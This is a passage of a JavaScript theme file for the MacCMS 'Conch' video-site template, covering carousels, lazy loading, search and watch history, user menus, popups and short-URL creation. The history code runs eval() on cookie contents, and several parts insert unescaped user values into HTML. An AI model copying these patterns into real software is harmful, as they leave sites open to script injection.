var Conch = {
	'Browser': {
		url: document.URL,
		domain: document.domain,
		title: document.title,
		urlpath: document.location.pathname,
		language: (navigator.browserLanguage || navigator.language).toLowerCase(),
        Swidth: $(window).width(),
		canvas: function() {
			return !!document.createElement("canvas").getContext
		}(),
		useragent: function() {
			var a = navigator.userAgent;
			return {
				mobile: !! a.match(/AppleWebKit.*Mobile.*/),
				ios: !! a.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
				android: -1 < a.indexOf("Android") || -1 < a.indexOf("Linux"),
				iPhone: -1 < a.indexOf("iPhone") || -1 < a.indexOf("Mac"),
				iPad: -1 < a.indexOf("iPad"),
				trident: -1 < a.indexOf("Trident"),
				presto: -1 < a.indexOf("Presto"),
				webKit: -1 < a.indexOf("AppleWebKit"),
				gecko: -1 < a.indexOf("Gecko") && -1 === a.indexOf("KHTML"),
				weixin: -1 < a.indexOf("MicroMessenger")
			}
		}()
	},
    'Cookie': {
		'Set':function(name,value,days){
	        var expires;
	        if (days) {
	            expires = days;
	        } else{
	            expires = "";
	        }
	        $.cookie(name,value,{expires:expires,path:'/'});
		},
		'Get':function(name){
			var styles = $.cookie(name);
		    return styles;
		},
		'Del':function(name){
	        $.cookie(name,null,{expires:-1,path: '/'});
		}
	},
    'Host': function(){
 
    },
    'Resize': function(){
        window.addEventListener('resize', function() {
            Conch.Search.Form();
            Conch.Other.Navs();
            Conch.Other.Set();
        });
    },
    'Images': {
        'Init': function(){
            Conch.Images.Lazyload();
            Conch.Images.Qrcode();
        },
		'Lazyload': function() {		
            $(".hl-lazy").lazyload({
                effect: "fadeIn",
                threshold: 200,
                failurelimit: 20,
            });
		},
		'Qrcode': function() {
            $('.hl-cans').each(function(){
                if ($(this).length) {
                    $(this).qrcode({
                        width:120,
                        height:120,
                        text:encodeURI(Conch.Browser.url)
                    });  
                    function convertCanvasToImage(canvas) {  
                        var image = new Image();  
                        image.src = canvas.toDataURL("image/png");  
                        return image;  
                    }   
                    var mycans=$('canvas')[0];   
                    var img=convertCanvasToImage(mycans);  
                    $(this).next('.hl-qrcode').append(img);
                }
            });
		}
	},
	'Swiper': {
        'Init': function() {
            $.getScript(maccms.path + "/template/conch/asset/js/set/swiper.min.js", function() {
                Conch.Swiper.Scrolls();
                Conch.Swiper.Navs();
                Conch.Swiper.Banners();
                Conch.Swiper.Lists();
                Conch.Swiper.Tabs();
            });
        },
        'Scrolls':function() {
            var scrollswiper = new Swiper('.conch-scrollbar', {
                direction: 'vertical',
                slidesPerView: 'auto',
                freeMode: true,
                scrollbar: {
                    el: '.swiper-scrollbar',
                    draggable: true,
                    hide: true,
                },
                mousewheel: true,
            });
            if (Conch.Browser.Swidth>992){
            var scrollswiper2 = new Swiper('.hl-play-scrollbar', {
                direction: 'vertical',
                slidesPerView: 'auto',
                freeMode: true,
                observer:true,
                observeSlideChildren:true,
                scrollbar: {
                    el: '.swiper-scrollbar',
                    draggable: true,
                    hide: true,
                },
                mousewheel: true,
            });
            }
        },
        'Navs': function() {
            if (Conch.Browser.Swidth<768){
            var navswiper = new Swiper('.hl-navswiper', {
                freeMode: true,
                slidesPerView: 'auto',
                slideClass: 'hl-slide-swiper',
                on: {
                    init: function() {
                        if (this.$el.find(".active").length>0){
                            $activewidth = this.$el.find(".active").parent().outerWidth(true);
                            $activeleft = this.$el.find(".active").parent()[0].offsetLeft;
                            $wrapwidth = this.$wrapperEl.parent().outerWidth(true);
                            $navwidth = 0;
                            this.slides.each(function() {
                                $navwidth+=parseInt($(this).outerWidth(true));
                            });
                            this.$wrapperEl.transition(300);
                            if ($activeleft < ($wrapwidth - parseInt($activewidth)) / 2) {
                                this.$wrapperEl.transform('translate3d(0px,0px,0px)')
                            } else if ($activeleft > $navwidth - (parseInt($activewidth) + $wrapwidth) / 2) {
                                this.$wrapperEl.transform('translate3d(' + ($wrapwidth - $navwidth) + 'px,0px,0px)')
                            } else {
                                this.$wrapperEl.transform('translate3d(' + (($wrapwidth - parseInt($activewidth)) / 2 - $activeleft) + 'px,0px,0px)')
                            }
                        }
                    },
                },
            });
            }
        },
        'Banners': function() {
            var vbswiper = new Swiper('.conch-br-swiper', {
                speed: 1000,
                slidesPerView: 1,
                spaceBetween: 10,
                autoplay: {
                    delay: 5000,
                    disableOnInteraction: false,
                },
                loop: true,
                loopAdditionalSlides : 1,
                navigation: {
                    nextEl: '.swiper-button-next',
                    prevEl: '.swiper-button-prev',
                },
                pagination: {
                    el: '.swiper-pagination',
                    clickable: true,
                },
                lazy: {
                    loadPrevNext: true,
                    loadOnTransitionStart: true,
                },
                on: {
                    init: function(){
                        this.$el.parents('.conch-br-box').removeClass('hl-hidden');
                    },
                    slideChangeTransitionEnd: function(){
                        $('.hl-lazy').lazyload({threshold: 130});
                        this.slides.find('.hl-br-thumb').css('opacity','1');
                    },
                },
                breakpoints: {
                   768: {
                      spaceBetween: 20,
                   },
                }
            });
        },
        'Lists':function(){
            var listswiper = new Swiper('.hl-list-swiper', {
                slidesPerView: 6,
                slidesPerGroup: 6,
                slideClass: 'hl-slide-swiper',
                observer: true,
                observeParents: true,
                navigation: {
                    nextEl: '.swiper-button-next',
                    prevEl: '.swiper-button-prev',
                },
                pagination: {
                    el: '.swiper-pagination',
                    type: 'fraction',
                },
                on: {
                    slideChangeTransitionEnd: function(){
                        $('.hl-lazy').lazyload({threshold: 130});
                    },
                    touchEnd: function(){
                        $('.hl-lazy').lazyload({threshold: 130});
                    },
                }, 
                breakpoints: {
                   1199: {
                      slidesPerView: 5,
                      slidesPerGroup : 5,
                   },
                   991: {
                      slidesPerView: 4,
                      slidesPerGroup : 4,
                   },
                   767: {
                      freeMode: true,
                      slidesPerView: 'auto', 
                      slidesPerGroup : 1,
                   },
                }
            });
            var listswiper2 = new Swiper('.hl-list-swiper2', {
                slidesPerView: 5,
                slidesPerGroup: 5,
                slideClass: 'hl-slide-swiper',
                observer: true,
                observeParents: true,
                navigation: {
                    nextEl: '.swiper-button-next',
                    prevEl: '.swiper-button-prev',
                },
                pagination: {
                    el: '.swiper-pagination',
                    type: 'fraction',
                },
                on: {
                    slideChangeTransitionEnd: function(){
                        $('.hl-lazy').lazyload({threshold: 130});
                    },
                    touchEnd: function(){
                        $('.hl-lazy').lazyload({threshold: 130});
                    },
                }, 
                breakpoints: {
                   1199: {
                      slidesPerView: 4,
                      slidesPerGroup : 4,
                   },
                   767: {
                      freeMode: true,
                      slidesPerView: 'auto', 
                      slidesPerGroup : 1,
                   },
                }
            });

        },
        'Tabs': function(){
            var tabsswiper = new Swiper('.hl-tabs-swiper', {
                freeMode: true,
                slidesPerView: 'auto',
                slideClass: 'hl-slide-swiper',
                on: {
                    touchEnd: function(){
                        $('.hl-lazy').lazyload({threshold: 130});
                    },
                },
            });   
        },
		
	},
    'Scroll': {
        'Init':function(){
            Conch.Scroll.Fixed();
            Conch.Scroll.Top();
        },
        'Fixed':function(){
            $(window).scroll(function(){
                var $this = $(this);
                var targetTop = $this.scrollTop();
                if (targetTop >= 100){
                    $("body").addClass("conch-adjust-fix");
                    $(".conch-headwrap").addClass("fixed").addClass("hl-tran5");
                }else{
                    $(".conch-headwrap").removeClass("fixed").removeClass("hl-tran5");
                    $("body").removeClass("conch-adjust-fix");
                };
                if (targetTop >= 200){
                    $(".conch-headwrap").addClass("active");
                }else{
                    $(".conch-headwrap").removeClass("active");
                };
                if (targetTop >= 900 && Conch.Browser.Swidth>991){
                    $(".hl-rb-side").addClass('hl-fadeIn').addClass("fixed");
                }else{
                    $(".hl-rb-side").removeClass("fixed").removeClass('hl-fadeIn');
                };
                if($('.hl-article-content').length>0){
                    var boxTop = $('.hl-article-content').offset().top,
                        boxHigh = $('.hl-article-content').height(),
                        boxStart = boxTop - targetTop,
                        boxEnd = (boxTop + boxHigh) - targetTop;
                    if (boxEnd > 279 && boxStart <= 90 && Conch.Browser.Swidth>768){
                        $(".hl-article-main .hl-tool-icon").addClass("fixed");
                    }else{
                        $(".hl-article-main .hl-tool-icon").removeClass("fixed");
                    };
                    if (boxEnd <= 279 && Conch.Browser.Swidth>768){
                        $(".hl-article-main .hl-tool-icon").addClass("bottom");
                    }else{
                        $(".hl-article-main .hl-tool-icon").removeClass("bottom");
                    };
                }
            });
        },
        'Top': function() {
            var a = $(window);
            $scrollTopLink = $(".hl-back-top");
            a.scroll(function() {
                500 < $(this).scrollTop() ? $scrollTopLink.css("display", "block") : $scrollTopLink.css("display", "none")
            });
            $scrollTopLink.on("click", function() {
                $("html, body").animate({
                    scrollTop: 0
                }, 400);
                return !1
            });
        },
    },
    'Search': {
        'Init':function(){
            Conch.Search.Select();
            Conch.Search.Submit();
            Conch.Search.Form();
            Conch.Search.History();
        },
        'Select':function(){
            var $Ssele = $(".hl-search-select");
            var $Sform = $Ssele.parent();
            var $Ssbox = $(".hl-ss-box");
            if($(".hl-ss-text").data("mid")!==1){
                $("body").addClass("conch-adjust-ss");
            };
            $Ssele.on('click', function(e){
                var $display = $Ssbox.css("display");
                if ($display =='block'){
                    $Ssbox.hide();
                    $Sform.removeClass("hl-select-op");
                }else{
                    $Ssbox.show();
                    $Sform.addClass("hl-select-op");
                    e.stopPropagation();
                    $("body").on('click', function(){
                        $Ssbox.hide();
                        $Sform.removeClass("hl-select-op");
                    });     
                };
            });
            $(".hl-ss-item span").on("click",function(){
                var $href = $(this).data("action");
                var $mid = $(this).data("mid");
                var $text = $(this).text();
                $(".hl-search").attr("action",$href);
                $(".hl-ss-text").attr("data-mid",$mid);
                $(".hl-ss-text").text($text);
                if($mid === 1){
                    $("body").removeClass("conch-adjust-ss");
                }else{
                    $("body").addClass("conch-adjust-ss");
                }
            });
        },
        'Submit':function(){
            var $Stext = $('.hl-search-text');
            var $Ssubm = $('.hl-search-submit');
            if ($Stext.val() == ""){
                $Ssubm.attr("disabled","true");
            }
            $Stext.on("input propertychange", function(){
                if($.trim($(this).val()) !== ""){
                    $Ssubm.removeAttr("disabled");
                }else {
                    $Ssubm.attr("disabled","true"); 
                }
            });
        },
        'Form':function(){
            var $Search = $('.conch-search');
            var $Right = $('.conch-list').innerWidth();
            var $Stext = $('.hl-search-text');
            var $Ssubm = $('.hl-search-submit');
            var $Ssele = $(".hl-search-select");
            var $Shbox = $(".hl-sh-box");
            if (Conch.Browser.Swidth<768){
                $('.conch-search').css('right',$Right);
                $('.hl-search-focus').click(function(){
                    $('body').addClass('conch-adjust-res');
                    $('.hl-sh-search > form > input').focus();
                })
            }
            $Stext.focus(function(){
                $Shbox.show();
                $Ssele.on('click', function(){
                    $Shbox.hide();
                });
                $("body").on("click",function(e){
                    if (!$(e.target).closest(".hl-search-text,#hl-search-empty,.hl-alert-box").length) {
                    $Shbox.hide();
                    }
                });
            });
            $Stext.bind('input propertychange', function() {
                $Shbox.hide();
            });
        },
        'History':function(){
            $(function(){
                update_history();
                $(document).keydown(function(event){
                    if(event.keyCode==13){ 
                        $('#hl-search-submit').click(); 
                    } 
                }); 
                if($('#hl-search-text').val() !== ""){
                    var mid = $(".hl-ss-text").data("mid");
                    var keywords = $('#hl-search-text').val();
                    if (mid===1){
                        history(keywords);
                    }
                };
                $('#hl-search-submit').on("click",function(){
                    update_history();
                })
                $("#hl-search-empty").on("click",function(){
                    mystorage.remove('keywords');
                    $(".hl-sh-item2").remove();
                })
            });
            function update_history(){
                var history = mystorage.get("keywords");
                if (history) {
                    $(".hl-sh-wrap").prepend('<div class="hl-sh-item hl-sh-item2"><div class="hl-sh-title">历史搜索<a href="javascript:;" id="hl-search-empty"><i class="iconfont hl-icon-lajitong"></i></a></div><ul id="hl-search-history" class="hl-sh-list clearfix"></ul></div>')
                    var html = "";
                    $.each(history,function(i,v){
                        html += "<li><a class='hl-bg-subs' href='"+conchtpl.surl+"?wd="+v+"' role='button'>"+v+"</a></li>"
                    })
                    $("#hl-search-history").html(html);
                };
            };
            function history(value){  
                var data = mystorage.get("keywords");
                if (!data) {
                    var data = [];
                }else if(data.length === 10){
                    data.shift();
                }else{};
                if (value) {
                    if (data.indexOf(value)<0) {
                        data.push(value);
                        mystorage.set("keywords",data);
                    };
                };
            };
            var mystorage = (function mystorage(){
                var ms = "mystorage";
                var storage=window.localStorage;
                if(!window.localStorage){
                    alert("浏览器不支持localstorage");
                    return false;
                }
                var set = function(key,value){
                    var mydata = storage.getItem(ms);
                    if(!mydata){
                        this.init();
                        mydata = storage.getItem(ms);
                    }
                    mydata = JSON.parse(mydata);
                    mydata.data[key] = value;
                    storage.setItem(ms,JSON.stringify(mydata));
                    return mydata.data;
                };
                var get = function(key){
                    var mydata = storage.getItem(ms);
                    if(!mydata){
                        return false;
                    }
                    mydata = JSON.parse(mydata);
                    return mydata.data[key];
                };
                var remove = function(key){
                    var mydata = storage.getItem(ms);
                    if(!mydata){
                        return false;
                    }
                    mydata = JSON.parse(mydata);
                    delete mydata.data[key];
                    storage.setItem(ms,JSON.stringify(mydata));
                    return mydata.data;
                };
                var clear = function(){
                    storage.removeItem(ms);
                };
                var init = function(){
                  storage.setItem(ms,'{"data":{}}');
                };
                return {set : set,get : get,remove : remove,init : init,clear : clear};
            })();
        },
        'Suggest':function($obj,$mid){
            $.getScript(maccms.path + "/template/conch/asset/js/set/autocomplete.js",function(){
            var SearchWidth = $('.hl-search-text').innerWidth();
            try {
                $($obj).autocomplete(maccms.path + '/index.php/ajax/suggest?mid=' + $mid, {
                    inputClass: "hl-search-input",
                    resultsClass: "conch-results hl-alert-box hl-bg-site hl-fadeIn",
                    width: SearchWidth, scrollHeight: 400, minChars: 1, matchSubset: 0,
                    cacheLength: 10, multiple: false, selectFirst: false, matchContains: true, autoFill: false,
                    dataType: "json",
                    parse: function (r) {
                        if (r.code == 1) {
                            var parsed = [];
                            $.each(r['list'], function (index, row) {
                                row.url = r.url;
                                parsed[index] = {
                                    data: row
                                };
                            });
                            return parsed;
                        } else {
                            return {data: ''};
                        }
                    },
                    formatItem: function (row, i, max) {
                        return row.name;
                    },
                    formatResult: function (row, i, max) {
                        return row.text;
                    }
                }).result(function (event, data, formatted) {
                    $(this).val(data.name);
                    location.href = data.url.replace('mac_wd', encodeURIComponent(data.name));
                });
            }
            catch(e){}
            });
        },
    },
    'History': {
		'Limit':12,
        'Days':7,
		'Json':'',
		'Init':function(){
			var get_history = Conch.Cookie.Get("history");
			if(get_history){
				var json=eval("("+get_history+")");
				var list="";
				for(i=0;i<json.length;i++){
					list = list + '<li class="hl-public-item"><a title="'+json[i].name+'" href="'+json[i].link+'"><div class="hl-item-pic hl-col-xs-4"><div class="hl-item-thumb hl-lazy" data-original="'+json[i].pic+'" style="background-image:url('+json[i].pic+');"><span class="hl-pic-icon hl-hidden-xs"><i class="iconfont hl-icon-bofang-fill"></i></span></div></div><div class="hl-item-content hl-col-xs-8"><div class="hl-item-title hl-text-site hl-lc-2">'+json[i].name+'</div><div class="hl-item-blurb hl-text-muted hl-lc-1"><span>继续观看'+json[i].part+'</span></div></div></a></li>';
				}
				$("#hl-history").append(list);
				$(".hl-hy-title").append('<a class="hl-hy-clear hl-text-muted hl-pull-right" target="_self" href="javascript:void(0)" onclick="Conch.History.Clear();"><i class="iconfont hl-icon-lajitong">清空</a>');
			}else{
				$("#hl-history").append('<li class="hl-empty-wrap hl-text-center hl-col-xs-12"><i class="iconfont hl-icon-wushuju"></i><p>暂无记录</p><p class="hl-user-tips"><a class="hl-bg-conch mac_user" href="javascript:void(0)">登录查看更多</a></p></li>');
			}
			if($(".hl-vod-history").length){
	            var $that = $(".hl-vod-history");
	            Conch.History.Set($that.attr('data-name'),$that.attr('data-link'),$that.attr('data-pic'),$that.attr('data-part'));
	        }
		},
		'Set':function(name,link,pic,part){
			if(!link){ link = document.URL;}
			var history = Conch.Cookie.Get("history");
			var len=0;
			var canadd=true;
			if(history){
			   history = eval("("+history+")"); 
			   len=history.length;
			   $(history).each(function(){
			      if(name===this.name){
			         canadd=false;
			         var json="[";
			         $(history).each(function(i){
			            var temp_name,temp_pic,temp_url,temp_part;
			            if(this.name===name){
			                 temp_name=name;temp_pic=pic;temp_url=link;temp_part=part;
			            }else{
			                 temp_name=this.name;temp_pic=this.pic;temp_url=this.link;temp_part=this.part;
			            }
			            json+="{\"name\":\""+temp_name+"\",\"pic\":\""+temp_pic+"\",\"link\":\""+temp_url+"\",\"part\":\""+temp_part+"\"}";
			            if(i!==len-1){
							json+=",";
						} 
			          });
			          json+="]";
			          Conch.Cookie.Set('history',json,this.Days);
			          return false;
			        }
			    });
			}
			if(canadd){
			    var json="[";
			    var isfirst="]";
			    isfirst=!len?"]":",";
			    json+="{\"name\":\""+name+"\",\"pic\":\""+pic+"\",\"link\":\""+link+"\",\"part\":\""+part+"\"}"+isfirst;
			     if(len>this.Limit-1){
					len-=1;
				 }   	
		        for(i=0;i<len-1;i++){
		            json+="{\"name\":\""+history[i].name+"\",\"pic\":\""+history[i].pic+"\",\"link\":\""+history[i].link+"\",\"part\":\""+history[i].part+"\"},";
		       	}
		        if(len>0){
		            json+="{\"name\":\""+history[len-1].name+"\",\"pic\":\""+history[len-1].pic+"\",\"link\":\""+history[len-1].link+"\",\"part\":\""+history[len-1].part+"\"}]";
		        }
			    Conch.Cookie.Set('history',json,this.Days);
			}  
		},
		'Clear': function(){
            Conch.Cookie.Del('history');
            $("#hl-history").empty();
			$(".hl-hy-list").html('<div class="hl-hy-clear-tips">已清空观看记录</div>');
        },
	},
    'User':{
        'IsLogin':0,
        'Init':function(){
            if($('.conch-user').length >0){
                $('body').on('click', '.conch-user', function(e){
                    MAC.User.Login();
                });
            }
            if(MAC.Cookie.Get('user_id') !=undefined && MAC.Cookie.Get('user_id')!=''){
                var $User = maccms.path + '/index.php/user',
                    $Favs = maccms.path + '/index.php/user/favs',
                    $Plays = maccms.path + '/index.php/user/plays',
                    $UserId = MAC.Cookie.Get('user_id'),
                    $UserName = MAC.Cookie.Get('user_name'),
                    $UserNickName = MAC.Cookie.Get('user_nick_name'),
                    $GroupId = MAC.Cookie.Get('group_id'),
                    $GroupName = MAC.Cookie.Get('group_name'),
                    $Portrait = MAC.Cookie.Get('user_portrait'),
                    $VIP = '<i class="iconfont hl-icon-zuanshi"></i>';
                    MAC.User.IsLogin = 1;
                if($UserNickName != null){
                    var $Name = $UserNickName;
                }else{
                    var $Name = $UserName;
                }
                if($('.conch-user').length >0) {
                    if ($('.conch-user').prop("outerHTML").substr(0, 2) == '<a') {
                        $('.conch-user').attr('title',$Name);
                        $('.conch-user').text('');
                        $('.conch-user').addClass('hl-user-face');
                        $('.conch-user').append('<img class="face" src="'+$Portrait+'" alt="'+$Name+'">');
                        if (Conch.Browser.Swidth<768){$('.conch-user').attr('href',$User);}
                    }
                    if($GroupId <3){
                        var $Group = $GroupName;
                    }else{
                        var $Group = $VIP + $GroupName;
                    }
                    var html = '<div class="hl-alert-box hl-bg-site hl-fadeIn-sm">';
                    html += '<div class="hl-user-box"><a class="hl-login-out hl-text-muted" href="javascript:;" onclick="MAC.User.Logout();" target="_self">退出</a><div class="hl-user-info hl-text-center"><span class="hl-user-name">'+$Name+'</span><span class="hl-user-point hl-text-muted">'+$Group+'</span></div><div class="hl-user-list hl-bg-subs hl-text-muted"><a href="'+$User+'" target="_blank"><i class="iconfont hl-icon-huiyuan"></i>主页</a><a href="'+$Plays+'" target="_blank"><i class="iconfont hl-icon-shijian"></i>历史</a><a href="'+$Favs+'" target="_blank"><i class="iconfont hl-icon-shoucang"></i>收藏</a></div></div>'
                    $('.conch-user').after(html);
                    $('.conch-user').removeClass('conch-user');
                }

            }
        }
    },
    'Alert':{
        'Init': function() {
            Conch.Alert.Popup();
        },
        'Close': function() {
            $('.hl-close-full').click(function(){
                $("html,body").removeClass("hl-htmlover");
                $('.hl-full-alert').removeClass('hl-full-x0')
            });
            $(".hl-pops-bg-active,.hl-from-list li").click(function(){
                $('.hl-half-alert').removeClass("hl-half-y0");
                $('.hl-from-btn').removeClass("hl-from-op");
                setTimeout(function(){
                    $(".hl-pops-bg-active").removeClass("hl-pops-bg-active");	
                    $(".hl-pops-bg").remove();	
                },200);
            });
        },
        'Popbg': function() {
            if($(".hl-pops-bg").length>0){
                $(".hl-pops-bg").addClass("hl-pops-bg-active");
            }else{
                $("body").append('<div class="hl-pops-bg"></div>');
                $(".hl-pops-bg").addClass("hl-pops-bg-active");
            }
        },
        'Popup': function() {
            $('.hl-alert-items').each(function(){
                if ($(this).length) {
                    $(this).hover(function(){
                        $(this).find(".hl-alert-box").show();
                        $(this).find('.hl-lazy').lazyload({threshold: 100});
                    },function(){
                        $(this).find(".hl-alert-box").hide();
                    })
                }
            });
            $('.hl-full-items').each(function(){
                if ($(this).length) {
                    var $this = $(this);
                    var $wrap = $(this).find('.hl-full-alert');
                    var $btn = $(this).parent().find('.hl-full-op');
                    $btn.click(function(){
                        if(Conch.Browser.Swidth<768){
                            $wrap.addClass('hl-full-x0');
                            $("html,body").addClass("hl-htmlover");
                        }else{
                            if($this.children().css('display')=='block'){
                                $this.parent().removeClass('hl-data-show');
                            }else{
                                $this.parent().addClass('hl-data-show');
                            }
                        }
                        $this.find('.hl-lazy').lazyload({threshold: 100});
                        Conch.Alert.Close();
                    });
                }
            });
            $('.hl-pops-items').each(function(){
                if ($(this).length) {
                    $(this).click(function(){
                        if(Conch.Browser.Swidth<768){
                            Conch.Alert.Popbg();
                        }
                        Conch.Alert.Close();
                    });
                }
            });
            $('.hl-half-items').each(function(){
                if ($(this).length) {
                    var $box = $(this).find('.hl-half-y100');
                    $(this).click(function(){
                        if(Conch.Browser.Swidth<768){
                            Conch.Alert.Popbg();
                        }
                        $box.addClass('hl-half-y0');
                        Conch.Alert.Close();
                    });
                }
            });
            $('.hl-from-buttons').each(function(){
                if ($(this).length) {
                    var $_this = $(this),
                        $btn = $_this.find('.hl-from-btn'),
                        $wrap = $_this.find('.hl-from-wrap');
                    $btn.click(function(){
                        var $__this = $(this);
                        $btn.addClass('hl-from-op');
                        $wrap.addClass('hl-half-y0');
                        if(Conch.Browser.Swidth<768){
                            Conch.Alert.Popbg();
                        }
                        Conch.Alert.Close();
                    });
                    $(".hl-from-list li").bind("click", function(){
                        var e = $(this).index(),
                            $from = $(".hl-from-btn"),
                            $href = $(this).data("href");
                        $(this).removeClass().addClass("active").siblings().removeClass();
                        $from.hide();
                        $from.eq(e).show();
                        $(".hl-play-btn").attr("href",$href);
                    });
                }
            });
        },
        'Notice':function(){
            if(Conch.Cookie.Get('tips')===null){
                Conch.Alert.Popbg();
                $("body").append('<div class="hl-poptips-wrap hl-bg-site"><div class="hl-poptips-title"><h2>'+conchtpl.tipt+'</h2></div><div class="hl-poptips-content">'+conchtpl.tipc+'</div><div class="hl-poptips-btn"><a class="hl-bg-conch no" href="javascript:;">我知道了</a><a class="hl-bg-subs" href="javascript:;">取消</a></div></div>');
                $(".hl-poptips-btn a.no").click(function() {
                    Conch.Cookie.Set('tips','ok',1);
                    $('.hl-poptips-wrap').remove();
                    $(".hl-pops-bg").remove();
                });
                $(".hl-poptips-btn a").click(function() {
                    $('.hl-poptips-wrap').remove();
                    $(".hl-pops-bg").remove();
                });
            }
        },
    },
    'Shows':{
        'Init': function() {
            Conch.Shows.Text();
            Conch.Shows.List();
            Conch.Shows.Sort();
            Conch.Shows.Tabs();
            Conch.Shows.Change();
            Conch.Shows.Copyright();
        },
        'Text': function() {
             $(".hl-show-text").each(function(){
                var $wrap=$(this).parent(),
                    $text=$wrap.find('.hl-content-text').children(),
                    $t=$(this).find('em');
                if($text.height() > 48){
                    $(this).show(); 
                }else{
                    $(this).hide();
                }
                $(this).on("click",function(){
                    if($wrap.hasClass("hl-content-hide")){
                        $wrap.removeClass('hl-content-hide');
                        $wrap.addClass('hl-content-show');
                        $t.text('收起')
                    }else{
                        $wrap.removeClass('hl-content-show');
                        $wrap.addClass('hl-content-hide');
                        $t.text('展开')
                    }
                });
            });
        },
        'List': function() {
            $('.hl-show-list').each(function(){
                var $wrap=$(this).parent().parent(),
                    $t=$(this).find('em');
                $(this).on('click',function(){
                    if($wrap.hasClass('hl-list-hide-xs')){
                        $(this).attr('href','javascript:void(0)');
                        $wrap.removeClass('hl-list-hide-xs');
                        $t.text('收起全部')
                    }else{
                        $(this).attr('href','#playlist');
                        $wrap.addClass('hl-list-hide-xs');
                        $t.text('展开全部')
                    }
                    Conch.Swiper.Scrolls();
                });
            });
        },
        'Sort': function() {
            $(".hl-sort-btn").each(function(){
                var $i=$(this).find('i');
                var $t=$(this).find('span');
                $(this).on("click",function(e){
                    if($i.hasClass("hl-icon-daoxu")){
                        $i.removeClass('hl-icon-daoxu');
                        $i.addClass('hl-icon-zhengxu');
                        $t.text('正序')
                    }else{
                        $i.removeClass('hl-icon-zhengxu');
                        $i.addClass('hl-icon-daoxu');
                        $t.text('倒序')
                    }
                    e.preventDefault();
                    $(this).parent().parent().find(".hl-sort-list").each(function(){
                        var $pl=$(this).find("li");
                        for(let i=0,j=$pl.length-1;i<j;){
                            var l=$pl.eq(i).clone(true);
                            var r=$pl.eq(j).replaceWith(l);
                            $pl.eq(i).replaceWith(r);
                            ++i;
                            --j;
                        }
                    });
                });
            });
        },
        'Tabs': function() {
            $('.hl-tabs-item').each(function(){
                if ($(this).length) {
                    var $_this = $(this);
                    var $tab = $_this.find('.hl-tabs .hl-tabs-btn');
                    var $box = $_this.find('.hl-tabs-box');
                    var $box2 = $_this.find('.hl-tabs-box2');
                    $tab.click(function(){
                        var $this = $(this);
                        var $t = $this.index();
                        $tab.removeClass('active');
                        $this.addClass('active');
                        $box.hide();
                        $box2.hide();
                        $box.eq($t).show();
                        $box2.eq($t).show();
                        $_this.find('.hl-tabs-box .hl-lazy').lazyload({threshold: 100});
                    })
                }       
            });
        },
        'Change': function(){
            if ($('.hl-more-change').length) {
                var divs=[];
                var divCnt = 3;
                for (var i=0;i<divCnt;i++) {
                   divs[i] = $(".hl-change-box"+(i+1));
                }
                var selectedDiv = 0;
                $('.hl-more-change').on('click', function(){
                    selectedDiv++;
                    selectedDiv = selectedDiv % divCnt;
                    for (var i=0;i< divCnt;i++) {
                       $(this).closest('.hl-row-box', '.hl-change-list').find(divs[i]).removeClass('hl-show').addClass('hl-hide'); 
                    }
                    $(this).closest('.hl-row-box', '.hl-change-list').find(divs[selectedDiv]).removeClass('hl-hide').addClass('hl-show'); 
                    $('.hl-lazy').lazyload({
                        threshold: 130
                    });
                });
            }
        },
        'Copyright':function(){
            var $nam = '苹果cms分享模板',
                $web = 'http://www.maccmsbox.com/',
                $qqh = '52225119/362695000',
                $qun = '638211',
                $ver = conchtpl.ver;
            console.log("%c 模版名称 %c "+$nam+" "+$ver+" (苹果CMSv10)", "background: #030307;color:#fadfa3;padding:5px;font-size:16px;font-weight:bold", "color:#030307;padding:5px;font-size:16px;");
            console.log("%c 模版官网 %c "+$web+"", "background: #030307;color:#fadfa3;padding:5px;font-size:16px;font-weight:bold", "color:#030307;padding:5px;font-size:16px;");
            console.log("%c使用模版请联系%c QQ："+$qqh+"  交流群："+$qun+"", "color:#030307;font-size:14px;line-height:32px;", "color:#ff1500;font-size:14px");
        },
    },
    'Other':{
        'Init': function() {
            Conch.Other.Color();
            Conch.Other.Navs();
            Conch.Other.Url();
            Conch.Other.Copy();
            Conch.Other.Set();
        },
        'Color': function() {
            var $cookie_color=$.cookie("color");
            var $btn = $(".hl-color-item a");
            if($cookie_color!=null){
                if($cookie_color=='black'){
                    $btn.attr("id","white");$btn.html('<i class="iconfont hl-icon-taiyang"></i><span>浅色模式</span>');
                }else{
                    $btn.attr("id","black");$btn.html('<i class="iconfont hl-icon-yueliang"></i><span>深色模式</span>');
                }
            }
			$(".hl-color-item a").click(function(){
                var $Color = $(this).attr("id"); 
                $("link[name='color']").attr("href","/template/conch/asset/css/"+$Color+".css?v="+conchtpl.ver+"");  
                $.cookie("color",$Color,{expires:365, path: '/'});
                if($Color=='black'){
                    $(this).attr("id","white");
                    $(this).html('<i class="iconfont hl-icon-taiyang"></i><span>浅色模式</span>');
                }else{
                    $(this).attr("id","black");
                    $(this).html('<i class="iconfont hl-icon-yueliang"></i><span>深色模式</span>');
                }
            });
		},
        'Navs': function() {
            $('.hl-nav-item').each(function(){
                var $Active = $('.hl-nav-item a.active'),
                    $Display = $Active.parent().css('display'),
                    $text = $Active.text();
                if ($Active.length>0 && $Display=='none') {
                    $('.hl-nav-more a>span').addClass('hl-text-conch').addClass('active');
                    $('.hl-nav-more a>span').text($text);
                }else{
                    $('.hl-nav-more a>span').removeClass('hl-text-conch').removeClass('active');
                    $('.hl-nav-more a>span').text('全部');
                }
            });
            $(".hl-open-menu").on('click', function(){
                $(".conch-menus").addClass("active");
                $(".conch-ms-close,.conch-ms-overlay").on('click', function(){
                    $(".conch-menus").removeClass("active");
                });
            });
        },
        'Url': function(){
            var short = $(".hl-short-url");
            if (conchtpl.slink=="") {
                var url = encodeURI(Conch.Browser.url);
            }else{
                var url = conchtpl.slink + encodeURI(Conch.Browser.urlpath);
            };
            if (conchtpl.short=='1'){
                if (conchtpl.api=='1'){
                    $.ajax({
                    url: conchtpl.aurl + url,
                    type: "GET",
                    dataType: "jsonp", 
                    cache: false,
                    success: function (data, status) {
                        for(x in data.data.urls[0]) ;
                        short.prepend( data.data.urls[0].url_short);
                    },
                    error: function(obj,info,errObj){
                        short.prepend(url);
                    },
                    });
                }else{
                    var ajax = new XMLHttpRequest();
                    var token = conchtpl.tok;
                    var longUrl = url;
                    var termOfValidity = conchtpl.term;
                    ajax.open('post','https://dwz.cn/admin/v2/create', 'true');
                    ajax.setRequestHeader("Content-Type", "application/json");
                    ajax.setRequestHeader("Token", token);
                    ajax.send(JSON.stringify({
                        Url: longUrl,
                        TermOfValidity: termOfValidity
                    }));
                    ajax.onreadystatechange = function () {
